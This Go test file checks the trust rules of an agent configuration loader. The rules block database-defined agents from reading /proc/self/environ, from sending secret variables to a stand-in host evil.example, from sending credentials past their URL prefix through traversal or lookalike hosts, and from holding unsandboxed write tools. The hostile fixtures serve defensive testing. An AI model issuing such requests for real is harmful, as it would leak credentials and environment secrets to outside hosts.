package spec

import (
	"reflect"
	"strings"
	"testing"
)

const trustBase = base + `
credentials:
  SURE_KEY: {url_prefix: "https://sure.example.com/api/"}
`

// loadDB loads trustBase with one database agent of spec js, and the file agents in files.
func loadDB(t *testing.T, js string, files map[string]string) error {
	t.Helper()
	all := map[string]string{"orbit.yaml": trustBase}
	for k, v := range files {
		all[k] = v
	}
	_, err := LoadAll(write(t, all), []Definition{{Name: "d", Version: 1, Enabled: true, Spec: []byte(js)}})
	return err
}

func TestADatabaseAgentReadsNoFile(t *testing.T) {
	err := loadDB(t, `{"name":"d","charter":"x","sources":[{"name":"env","kind":"file","path":"/proc/self/environ"}]}`, nil)
	if err == nil || !strings.Contains(err.Error(), `source "env": a file source reads orbit's own filesystem`) {
		t.Fatalf("err = %v", err)
	}
	// A file agent is reviewed with the deployment and keeps them.
	if err := loadDB(t, `{"name":"d","charter":"x"}`, map[string]string{"agents/f.yaml": "name: f\ncharter: x\nsources: [{name: notes, kind: file, path: /data/notes.md}]\n"}); err != nil {
		t.Fatal(err)
	}
}

func TestADatabaseAgentReferencesOnlyCredentials(t *testing.T) {
	err := loadDB(t, `{"name":"d","charter":"x","sources":[{"name":"leak","kind":"http","url":"https://evil.example/",
	  "headers":{"X":"${ORBIT_GITHUB_APP_PRIVATE_KEY}"},"query":{"q":"${ORBIT_API_TOKEN}"}}]}`, nil)
	for _, want := range []string{"${ORBIT_GITHUB_APP_PRIVATE_KEY} is not in orbit.yaml's credentials", "${ORBIT_API_TOKEN} is not in orbit.yaml's credentials"} {
		if err == nil || !strings.Contains(err.Error(), want) {
			t.Fatalf("err = %v, want %q", err, want)
		}
	}
	if err := loadDB(t, `{"name":"d","charter":"x","sources":[{"name":"tx","kind":"http","url":"https://sure.example.com/api/v1/transactions",
	  "headers":{"X-Api-Key":"${SURE_KEY}"}}]}`, nil); err != nil {
		t.Fatal(err)
	}
	// A credential outside its prefix fails at load when the URL is known, for every agent.
	err = loadDB(t, `{"name":"d","charter":"x","sources":[{"name":"tx","kind":"http","url":"https://sure.example.com.evil.example/api/",
	  "headers":{"X-Api-Key":"${SURE_KEY}"}}]}`, nil)
	if err == nil || !strings.Contains(err.Error(), "credential SURE_KEY may be sent only to https://sure.example.com/api/") {
		t.Fatalf("err = %v", err)
	}
	err = loadDB(t, `{"name":"d","charter":"x"}`, map[string]string{"agents/f.yaml": "name: f\ncharter: x\nsources: [{name: p, kind: prometheus, url: 'https://prom.example/', expr: 'up{k=\"${SURE_KEY}\"}'}]\n"})
	if err == nil || !strings.Contains(err.Error(), `agent "f": source "p": credential SURE_KEY may be sent only to`) {
		t.Fatalf("err = %v", err)
	}
	// A file agent may still name any variable that is not a credential.
	if err := loadDB(t, `{"name":"d","charter":"x"}`, map[string]string{"agents/f.yaml": "name: f\ncharter: x\nsources: [{name: s, kind: http, url: 'https://x.example/', headers: {K: '${ANY_VAR}'}}]\n"}); err != nil {
		t.Fatal(err)
	}
}

func TestCredentialPrefixesAreWhole(t *testing.T) {
	for _, p := range []string{"https://sure.example.com", "https://sure.example.com/api", "ftp://x.example/", "https://u:p@x.example/",
		"https://x.example/?a=1", "/api/", "https://x.example/#f"} {
		_, err := Load(write(t, map[string]string{"orbit.yaml": base + "credentials: {K: {url_prefix: \"" + p + "\"}}\n"}))
		if err == nil || !strings.Contains(err.Error(), `credential "K": url_prefix`) {
			t.Errorf("%s: err = %v", p, err)
		}
	}
	if _, err := Load(write(t, map[string]string{"orbit.yaml": base + "credentials: {lower: {url_prefix: \"https://x.example/\"}}\n"})); err == nil {
		t.Fatal("a lower-case credential name was accepted")
	}
	cs := Credentials{"K": {URLPrefix: "https://x.example/api/"}}
	for u, ok := range map[string]bool{
		"https://x.example/api/v1?q=1":     true,
		"https://x.example/api/../admin":   false,
		"https://x.example/api/%2e%2e/a":   false,
		"https://x.example/apiv2/":         false,
		"https://x.example.evil.com/api/":  false,
		"http://x.example/api/":            false,
		"https://x.example/api/./v1":       false,
		"https://x.example/api/v1/a.b/c.d": true,
	} {
		if err := cs.Check("K", u); (err == nil) != ok {
			t.Errorf("%s: err = %v", u, err)
		}
	}
	if err := cs.Check("OTHER", "https://anywhere/"); err != nil {
		t.Fatal("a variable that is not a credential is not bound")
	}
}

func TestADatabaseAgentGetsNoUnsandboxedWriteTools(t *testing.T) {
	for _, tool := range []string{"Bash", "Edit", "Write", "NotebookEdit", "mcp__x__y"} {
		err := loadDB(t, `{"name":"d","charter":"x","tools":["WebFetch","`+tool+`"]}`, nil)
		if err == nil || !strings.Contains(err.Error(), `tools: "`+tool+`" is not allowed outside a sandbox`) {
			t.Errorf("%s: err = %v", tool, err)
		}
	}
	if err := loadDB(t, `{"name":"d","charter":"x","tools":["WebSearch","WebFetch","Read"]}`, nil); err != nil {
		t.Fatal(err)
	}
	if err := loadDB(t, `{"name":"d","charter":"x"}`, map[string]string{"agents/f.yaml": "name: f\ncharter: x\ntools: [Bash, Write]\n"}); err != nil {
		t.Fatal(err)
	}
	// The built-in agent is within the list (its replacement in the database is held to it).
	for _, a := range Builtins(Deployment{Runners: map[string]RunnerSpec{"r": {Kind: "claude-code"}}}) {
		if errs := (&Config{}).validateTrust(a); len(errs) > 0 {
			t.Fatal(errs)
		}
	}
}

func TestAWorkersStoredAgentKeepsFileAgentPowers(t *testing.T) {
	// A worker rebuilds agents from the database without their origin; control already held them to their origin's limits.
	a := &Agent{Name: "f", Tools: []string{"Bash"}, Sources: []Source{{Name: "n", Kind: "file", Path: "/x"}}, Gates: []Gate{{Kind: "precheck", Command: "true"}}}
	if a.Restricted() {
		t.Fatal("an agent with no origin is restricted")
	}
}

func TestWidening(t *testing.T) {
	src := Source{Name: "tx", Kind: "http", URL: "https://sure.example.com/api/", Headers: map[string]string{"K": "${SURE_KEY}"}, MaxBytes: 8}
	cur := &Agent{Tools: []string{"WebSearch"}, Sources: []Source{src}, Needs: []string{"sure"},
		Actions: ActionSet{"notify": RuleApprove, "agent:define": RuleAuto}}
	same := *cur
	same.Charter = "new words"
	same.Actions = ActionSet{"notify": RuleDeny, "agent:define": RuleAuto}
	same.Tools = nil
	cur.Delegates, same.Delegates = []string{"*"}, []string{"builder"}
	if w := Widening(cur, &same); len(w) != 0 {
		t.Fatalf("a narrowing change widens: %v", w)
	}
	cur.Delegates = nil
	moved := src
	moved.URL = "https://evil.example/"
	next := &Agent{Tools: []string{"WebSearch", "WebFetch"}, Sources: []Source{moved, {Name: "b", Kind: "http", URL: "https://b/", Query: map[string]string{"k": "${OTHER}"}}},
		Needs: []string{"sure", "docker-network:hetzner"}, Actions: ActionSet{"notify": RuleAuto, "continue": RuleApprove, "webhook:x": RuleDeny},
		Delegates: []string{"builder"}}
	want := []string{"tool WebFetch", "source tx", "source b", "credential OTHER", "action continue: approve, was deny",
		"action notify: auto, was approve", "delegate to builder", "need docker-network:hetzner"}
	if w := Widening(cur, next); !reflect.DeepEqual(w, want) {
		t.Fatalf("widening =\n%q\nwant\n%q", w, want)
	}
	// A new agent widens by whatever reach it has; a bare one by nothing.
	if w := Widening(nil, &Agent{Name: "n", Charter: "x"}); len(w) != 0 {
		t.Fatalf("bare = %v", w)
	}
	if w := Widening(nil, &Agent{Tools: []string{"WebFetch"}, Actions: ActionSet{"agent:define": RuleAuto}}); !reflect.DeepEqual(w, []string{"tool WebFetch", "action agent:define: auto, was deny"}) {
		t.Fatalf("new = %v", w)
	}
}
